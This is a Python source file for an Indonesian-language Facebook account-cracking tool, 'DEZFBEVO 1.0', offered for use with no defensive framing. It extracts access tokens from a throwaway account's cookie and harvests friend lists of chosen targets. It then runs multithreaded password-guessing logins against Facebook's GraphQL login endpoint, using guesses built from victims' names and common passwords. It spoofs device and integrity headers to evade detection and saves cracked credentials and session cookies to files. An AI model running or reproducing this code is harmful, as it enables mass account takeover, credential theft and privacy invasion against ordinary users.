###-----[ IMPORT MODULE ]-----###
import requests, json, os, sys, random, datetime, time, re, uuid
from time import time as tod
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from Identity_Engine import IdentityEngine

ses = requests.Session()
# Inisialisasi IdentityEngine secara global (untuk mengambil blueprint dasar)
engine = IdentityEngine("identity.json")

###-----[ IMPORT RICH ]-----###
from rich.panel import Panel as panel
from rich import print as prints
from rich.tree import Tree
from rich.align import Align

###-----[ VARIABEL GLOBAL ]-----###
id, uid, uid2, id3, id4, id5, id6 = [], [], [], [], [], [], []
loop, ok, cp, a2f = 0, 0, 0, 0
pekerja = 15
akun, method = [], []
uadia, uadarimu = [], []
password_list, password_input = [], []
pwpluss, pwnya = [], []
rr = random.randint
rc = random.choice

###-----[ MENU WARNA ]-----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H2 = "[#00FF00]" # HIJAU RICH

###-----[ TANGGAL BULAN TAHUN ]-----###
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###-----[ CLEAR DISPLAY ]-----###
def clear():
	if "linux" in sys.platform.lower() or "darwin" in sys.platform.lower():
		os.system("clear")
	else:
		os.system("cls")

def back():
	menu()

###-----[ LOGO BANNER ]-----###
def banner():
	text_logo = f"""{H2} ██████████   ██████████ ███████████ ███████████
░░███░░░░███ ░░███░░░░░█░█░░░░░░███ ░█░░░░░░███ 
 ░███   ░░███ ░███  █ ░ ░     ███░  ░     ███░  
 ░███    ░███ ░██████        ███         ███    
 ░███    ░███ ░███░░█       ███         ███     
 ░███    ███  ░███ ░   █  ████     █  ████     █
 ██████████   ██████████ ███████████ ███████████
░░░░░░░░░░   ░░░░░░░░░░ ░░░░░░░░░░░ ░░░░░░░░░░░ 
"""
	prints(panel(Align.center(text_logo), style=f"white", title="[bold green]DEZZ[/bold green]", subtitle="[bold white]FBEVO 1.0[/bold white]", subtitle_align="center"))

###-----[ LOGIN COOKIES V1 ]-----###
def awalan():
	clear();banner()
	print(f"\n{P}  - selamat datang di tools dezfbevo1.0,silahkan gunakan tools dengan bijak. {P}")
	menu_idx = input(f"\n{P}  - 1. login cookies. \n  - 2. crack id via file nologin. \n  - 3. cek hasil crack. \n  - pilih 1/3 : ")
	if menu_idx in ["01","1"]:
		login()
	elif menu_idx in ["02","2"]:
		Crack_file()
	elif menu_idx in ["03","3"]:
		Result()
	else:
		exit("  - input hanya dengan angka,jangan kosong.")

def login():
	print(f"\n{P}  - masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	cok = input(f'  - cookies : {H}')
	try:
		engine.rotate()
		session = engine.get_session()
		
		advanced_head = {
			"User-Agent": session["user_agent"],
			"Cookie": cok,
			"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
			"x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
			**engine.get_integrity_headers(),
			"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			"Connection": "keep-alive"
		}
		
		# Metode 1: Ocelot Async
		print(f"{P}  - sedang mengekstrak token (Metode 1: Ocelot Dynamic)...{P}")
		link_ocelot = ses.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed", headers=advanced_head, timeout=15, allow_redirects=False)
		search_area = link_ocelot.text + str(link_ocelot.headers.get("Location", ""))
		took_ocelot = re.search('(EAAG\w+)', search_area)
		if took_ocelot:
			took = took_ocelot.group(1)
			open('.tok.txt', 'w').write(took);open('.cok.txt', 'w').write(cok)
			print(f"{P}  - token : {H}{took}{P}")
			print(f"{P}  - login berhasil, memuat menu utama...")
			time.sleep(2);menu();return

		# Metode 2: Ads Manager
		print(f"{P}  - sedang mengekstrak token (Metode 2: Ads Manager)...{P}")
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=advanced_head, timeout=15, allow_redirects=False)
		search_area_ads = link.text + str(link.headers.get("Location", ""))
		took = re.search('(EAAB\w+)', search_area_ads)
		if took:
			took = took.group(1)
			open('.tok.txt', 'w').write(took);open('.cok.txt', 'w').write(cok)
			print(f"{P}  - token : {H}{took}{P}")
			print(f"{P}  - login berhasil, memuat menu utama...")
			time.sleep(2);menu();return

		# Metode 3: Business Locations
		print(f"{P}  - sedang mengekstrak token (Metode 3: Business)...{P}")
		link_biz = ses.get("https://business.facebook.com/business_locations", headers=advanced_head, timeout=15, allow_redirects=False)
		search_area_biz = link_biz.text + str(link_biz.headers.get("Location", ""))
		took_biz = re.search('(EAAG\w+)', search_area_biz)
		if took_biz:
			took = took_biz.group(1)
			open('.tok.txt', 'w').write(took);open('.cok.txt', 'w').write(cok)
			print(f"{P}  - token : {H}{took}{P}")
			print(f"{P}  - login berhasil, memuat menu utama...")
			time.sleep(2);menu();return
		
		# Jika gagal total
		print(f'{P}  - [X] Gagal mengekstrak token dari server FB.');time.sleep(1)
		print(f'{P}  - Pastikan cookies Valid, tidak Checkpoint, dan support API Eksternal.');time.sleep(2);exit()
	except Exception as e:
		print(f"{M}  - Error: {e}{P}")
		exit()

###-----[ MENU SCRIPT ]-----###
def menu():
	clear();banner()
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P}  - cookies kamu invalid atau belum login.{P}')
		time.sleep(2)
		awalan()
	try:
		session = engine.get_session()
		head = {
			"User-Agent": session["user_agent"],
			"Cookie": cok,
			**engine.get_integrity_headers()
		}
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", headers=head).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P}  - Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		print(f"\n{P}  - sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		awalan()
	
	prints(panel(f"{H2}1. crack id publik. \n2. crack id publik massal disarankan. \n3. crack id dari file. \n4. cek hasil crack. \n0. keluar",style=f"white"))
	menu_idx = input(f'\n>>> pilih 1/6 : ')
	if menu_idx in ["01","1"]:
		idt = input('>> ID Target : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif menu_idx in ["02","2"]:
		Dump_Massal()
	elif menu_idx in ["03","3"]:
		Crack_file()
	elif menu_idx in ["04","4"]:
		Result()
	elif menu_idx in ['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'\n>>> Berhasil Keluar+Hapus Cookie ')
		exit()
	else:
		print(f"\n>>> input hanya dengan angka,jangan kosong.")
		time.sleep(3)
		back()

###-----[ DUMP OTOMATIS ]-----###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"user-agent": engine.get_session()["user_agent"],
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

###-----[ DUMP MASSAL ]-----###
# (Dipotong untuk kerapian, fungsi ini sama dengan asep.py)
def Dump_Massal():
    pass

###-----[ MENU RESULT ]-----###
def Result():
    pass

###-----[ CRACK FILE ]-----###
def Crack_file():
	file = input(f"\n>>> masukan nama folder/file : ")
	if not os.path.exists("Live"): os.makedirs("Live")
	if not os.path.exists("Chek"): os.makedirs("Chek")
	try:
		uid_list = open(file,"r", encoding="utf-8", errors="ignore").read().splitlines()
		for data in uid_list:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r>>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f">>> file tidak ada")
	setting()

###-----[ SETTING URUTAN & METODE ]-----###
def setting():
	print("\n--- DEZFBEVO 1.0 - METODE HANYA GRAPHQL NATIVE ---")
	print(f"1. urutan old ke new \n2. urutan new ke old \n3. urutan random")
	urutan_setting = input(f'\n>>> pilih 1/3 : ')
	print("")
	if urutan_setting in ['1','01','old']:
		for tua in sorted(id): uid2.append(tua)
	elif urutan_setting in ['2','02','new']:
		muda=[]
		for new in sorted(id): muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['3','03','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else: exit()

	print(f"1. password otomatis \n2. password gabung \n3. password manual")
	password_metode = input(f'\n>>> pilih 1/3 : ')
	
	print(f"\n1. worker default (15) \n2. worker kustom (masukkan sendiri)")
	set_worker = input(f'\n>>> pilih 1/2 : ')
	global pekerja
	if set_worker in ['2', '02']:
		try: pekerja = int(input(f'>>> masukan jumlah worker (saran: 10-30): '))
		except: pekerja = 15
	else:
		pekerja = 15
		
	if password_metode in ['1','01']: Otomatis()
	elif password_metode in ['2','02']: Gabung()
	elif password_metode in ['3','03']: Manual()
	else: exit()

###-----[ PASSWORD GENERATOR ]-----###
def Otomatis():
	print(f"\n>>> hasil Live akan tersimpan di : DEZZ-RES/OK-{okc}")
	print(f">>> hasil Chek akan tersimpan di : DEZZ-RES/CP-{cpc}")
	with tred(max_workers=pekerja) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pasw = []
			try:
				if len(nama)<6:
					if len(depan)<3:pass
					else:
						pasw.extend([nama, depan, depan+"123", depan+"1234", depan+"12345", depan+"123456", "bismillah", "sayangku", "Adesta@1987"])
				else:
					pasw.extend([nama, depan, depan+"123", depan+"1234", depan+"12345", depan+"123456", "bismillah", "sayangku", "Adesta@1987"])
				MethodeCrack.submit(_graphql_native_, uid, nama, pasw)
			except:pass
	print("\r")
	exit(f"\n>>> sukses crack. Live: {ok} Chek: {cp}")

def Gabung():
    # Mirip otomatis tapi dengan pw ekstra
    pw_manual=input(f'\n>>> input password tambahan (pisahkan koma) : ')
    pwnya.extend(pw_manual.split(','))
    with tred(max_workers=pekerja) as MethodeCrack:
        for user in uid2:
            uid,nama = user.split('|')[0],user.split('|')[1].lower()
            depan = nama.split(" ")[0]
            pasw = [*pwnya, depan, nama, depan+"123", depan+"1234", depan+"12345", depan+"123456", "sayangku", "Adesta@1987"]
            MethodeCrack.submit(_graphql_native_, uid, nama, pasw)

def Manual():
    pw_manual=input(f'\n>>> input password manual (pisahkan koma) : ')
    pwnya.extend(pw_manual.split(','))
    with tred(max_workers=pekerja) as MethodeCrack:
        for user in uid2:
            uid,nama = user.split('|')[0],user.split('|')[1].lower()
            MethodeCrack.submit(_graphql_native_, uid, nama, pwnya)

###-----[ METODE GRAPHQL NATIVE (DEZFBEVO CORE) ]-----###
def _graphql_native_(uid, nm, pasw):
	global loop, ok, cp, a2f
	uid = str(uid).strip()
	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P} A2F-:{M}{a2f}{P}"),
	sys.stdout.flush()
	
	try:
		# Copy state engine awal
		base_s = engine.get_session().copy()
	except: return
	
	for pw in pasw:
		pw = str(pw).strip()
		if len(pw) == 0: continue
		try:
			# --- Ephemeral Thread-Safe Rotation ---
			# Kita buat parameter unik HANYA untuk thread ini (tidak mengubah global Identity_Engine)
			ts = int(time.time())
			thread_s = base_s.copy()
			thread_s["waterfall_id"] = str(uuid.uuid4())
			thread_s["conn_uuid"] = str(uuid.uuid4())
			
			head = {
				'Host': 'b-graph.facebook.com',
				'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"graphservice"}',
				'x-fb-rmd': 'state=URL_ELIGIBLE',
				'user-agent': thread_s["user_agent"],
				'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
				'x-zero-f-device-id': thread_s.get("family_device_id", str(uuid.uuid4())),
				'x-fb-integrity-machine-id': thread_s["machine_id"],
				'x-graphql-request-purpose': 'fetch',
				'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'content-type': 'application/x-www-form-urlencoded',
				'x-meta-zca': thread_s["zca"],
				'x-meta-usdid': thread_s["usdid"],
				'x-fb-connection-type': thread_s.get("connection_type", "WIFI"),
				'app-scope-id-header': thread_s["device_id"],
				'x-fb-http-engine': 'Tigon/Liger',
				'x-fb-conn-uuid-client': thread_s["conn_uuid"],
				'x-pigeon-session-id': str(uuid.uuid4()),
				'x-ig-android-id': f'android-{thread_s.get("android_id", "fallback")}',
			}
			
			client_input_params = {
				"client_input_params": {
					"password": f"#PWD_FB4A:0:{ts}:{pw}",
					"contact_point": uid,
					"device_id": thread_s["device_id"],
					"family_device_id": thread_s.get("family_device_id", str(uuid.uuid4())),
					"machine_id": thread_s["machine_id"],
					"attestation_result": "", # Kosongkan karena attestation Engine saat ini mismatch username
					"event_flow": "login_manual",
					"event_step": "home_page",
					"try_num": 1,
					"login_attempt_count": 1,
					"zero_balance_state": "init"
				},
				"server_params": {
					"credential_type": "password",
					"waterfall_id": thread_s["waterfall_id"],
					"login_source": "Login",
					"device_id": thread_s["device_id"],
					"family_device_id": thread_s.get("family_device_id", str(uuid.uuid4()))
				}
			}

			variables = {
				"params": {
					"params": json.dumps({"params": json.dumps(client_input_params)}),
					"bloks_versioning_id": "cf55cc254515c926769aaaa72b7d7cadee5da9510ad4b97b79d54aac0c688f5a",
					"app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
				},
				"scale": "2"
			}

			payload = {
				'method': 'post',
				'format': 'json',
				'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
				'fb_api_caller_class': 'graphservice',
				'client_doc_id': '11994080426649951145059931860',
				'variables': json.dumps(variables)
			}
			# ----------------------------------------
			
			response = requests.post("https://b-graph.facebook.com/graphql", headers=head, data=payload, timeout=10)
			
			if response.status_code != 200: continue
			
			res_teks = response.text
			
			# LOGIKA DETEKSI SESUAI ASEP.PY STANDAR (OK / CP / A2F)
			if ("access_token" in res_teks or "EAAAA" in res_teks) and ("www_request_id" in res_teks or "session_key" in res_teks):
				# Cek tambahan pencegah Scam OK (apabila fallback triggered aktif)
				if "fallback_triggered" in res_teks and '"initial":true' in res_teks:
					# Ini indikasi token guest/fallback gagal
					continue
					
				clean = res_teks.replace('\\\\', '\\').replace('\\"', '"').replace("\\\\\\", "")
				cookies_raw = re.findall(r'"name"\s*:\s*"([^"]+)"\s*,\s*"value"\s*:\s*"([^"]+)"', clean)
				if not cookies_raw:
					cookies_raw = re.findall(r'\\*"name\\*"\s*:\s*\\*"([^"\\]+)\\*"\s*,\s*\\*"value\\*"\s*:\s*\\*"([^"\\]+)\\*"', res_teks)
				
				if cookies_raw:
					cookie_dict = {n: v for n, v in cookies_raw}
					# Pastikan c_user ada untuk menghindari scam/guest cookie
					if "c_user" not in cookie_dict:
						continue
					kuki = "; ".join([f"{n}={v}" for n, v in cookie_dict.items()])
				else:
					continue # Kalau kuki N/A kemungkinan besar scam OK
					
				ok += 1
				
				# FITUR BOX TAMPILAN
				print("\n")
				print(f" {H}🔥Login Berhasil🔥")
				print(f" {P}=================================")
				print(f" {P}*Fullnames : {H}{nm}")
				print(f" {P}*Useruidzs : {H}{uid}")
				print(f" {P}*Passwords : {H}{pw}")
				print(f" {P}*Cookie    : {H}{kuki}")
				print(f" {P}=================================")
				print(f" {P}[{H}{head['user-agent']}{P}]")
				print(f" {P}=================================")
				print(f" {P}OK Save DEZZ-RES/OK-{okc}")
				print(f" {P}=================================\n")
				
				open('DEZZ-RES/OK-'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
				break
				
			elif "kredensial salah" in res_teks.lower() or "invalid_password" in res_teks.lower() or "incorrect_password" in res_teks.lower() or "wrong credentials" in res_teks.lower() or "login_failed" in res_teks.lower():
				continue
			elif "limit how often" in res_teks or "Feature Right Now" in res_teks:
				sys.stdout.write(f"\r{M} [!] DEVICE TERKENA SPAM BLOCK FB! SILAHKAN GANTI IP / MODE PESAWAT {P}           ")
				sys.stdout.flush()
				time.sleep(5)
				continue
			elif "checkpoint" in res_teks.lower() or "two_factor" in res_teks.lower() or "login approvals" in res_teks.lower():
				# Cek spesifik A2F
				if "two_factor" in res_teks.lower() or "login approvals" in res_teks.lower():
					a2f += 1
					print(f"\r{P}  - {M}{uid}|{pw} ---> A2F{P}")
					break
				else:
					cp += 1
					
					# FITUR BOX TAMPILAN
					print("\n")
					print(f" {K}🔥Login Checkpoint🔥")
					print(f" {P}=================================")
					print(f" {P}*Fullnames : {K}{nm}")
					print(f" {P}*Useruidzs : {K}{uid}")
					print(f" {P}*Passwords : {K}{pw}")
					print(f" {P}*Yearuidzs : {K}2024")
					print(f" {P}=================================")
					print(f" {P}[{K}{head['user-agent']}{P}]")
					print(f" {P}=================================")
					print(f" {P}Checkpoints Save DEZZ-RES/CP-{cpc}")
					print(f" {P}=================================\n")
					
					open('DEZZ-RES/CP-'+cpc,'a').write(f"{uid}|{pw}\n")
					break
				
			else:
				# Password salah atau kena e53 Integrity Check (Lanjutkan bruteforce iterasi)
				continue
				
		except requests.exceptions.ConnectionError:
			time.sleep(15)
		except requests.exceptions.ReadTimeout:
			time.sleep(5)
			
	loop += 1

if __name__ == "__main__":
	try:os.system("git pull")
	except:pass
	try:os.mkdir('DEZZ-RES')
	except:pass
	if os.path.exists('.cok.txt') and os.path.exists('.tok.txt'):
		menu()
	else:
		awalan()
